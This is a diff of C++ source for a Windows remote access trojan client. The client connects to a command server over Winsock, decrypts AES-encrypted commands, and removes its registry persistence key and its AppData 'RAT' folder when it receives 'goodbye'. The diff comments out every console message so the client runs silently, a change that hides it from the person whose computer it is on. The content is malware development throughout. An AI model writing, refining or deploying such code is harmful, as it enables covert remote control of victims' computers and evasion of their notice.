@@ -16,10 +16,10 @@
 bool initWinsock() {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
-        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
+        //std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
         return false;
     }
-    std::cout << "Winsock initialized.\n";
+    //std::cout << "Winsock initialized.\n";
     return true;
 }
 
@@ -28,7 +28,7 @@ SOCKET connectToServer(const std::string& ip, int port) {
     int m;
     SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (s == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
+        //std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
         return INVALID_SOCKET;
     }
 
@@ -42,7 +42,7 @@ SOCKET connectToServer(const std::string& ip, int port) {
         closesocket(s);
         return INVALID_SOCKET;
     }
-    std::cout << "Connected to server.\n";
+    //std::cout << "Connected to server.\n";
     return s;
 }
 
@@ -119,7 +119,7 @@ void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string&
         std::string messages_dec = decryptAES(key,message_enc);
 
         if (messages_dec == "goodbye") {
-            std::cout << "Comando goodbye recibido " << std::endl;
+            //std::cout << "Comando goodbye recibido " << std::endl;
             // delete persistence
             const std::wstring persistValue = L"RATPersistence";
             deletePersistence(persistValue);
@@ -129,12 +129,12 @@ void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string&
             std::filesystem::path rat_path = appdata_path / "RAT";
             if (directoryExist(rat_path)) {
                 if (deletePath(rat_path)) {
-                    std::cout << "RAT directory in AppData eliminated." << std::endl;
+                    //std::cout << "RAT directory in AppData eliminated." << std::endl;
                 } else {
-                    std::cout << "Could not delete the RAT directory." << std::endl;
+                    //std::cout << "Could not delete the RAT directory." << std::endl;
                 }
             } else {
-                std::cout << "RAT directory does not exist." << std::endl;
+                //std::cout << "RAT directory does not exist." << std::endl;
             }
 
             // delete rat client
